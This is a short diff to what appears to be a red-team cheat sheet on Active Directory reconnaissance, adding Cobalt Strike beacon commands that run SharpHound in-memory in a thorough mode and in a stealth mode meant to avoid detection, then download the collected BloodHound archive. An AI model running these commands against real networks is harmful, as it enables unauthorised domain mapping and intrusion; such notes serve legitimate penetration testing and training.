@@ -1372,9 +1372,13 @@ Get-ObjectACL -DistinguishedName "dc=companyx,dc=com" -ResolveGUIDs | ? { ($_.Ob
 SharpHound
 
 ```
-beacon> execute-assembly /opt/tools/SharpHound.exe -c All
-[...]
+# thorough
+beacon> execute-assembly /opt/tools/SharpHound.exe -c All,GpoLocalGroup -d vault.local
 
+# stealth
+beacon> execute-assembly c:\tools\sharphound3.exe -c dconly --stealth
+
+# download
 beacon> download .\20210210043130_BloodHound.zip
 ```
 
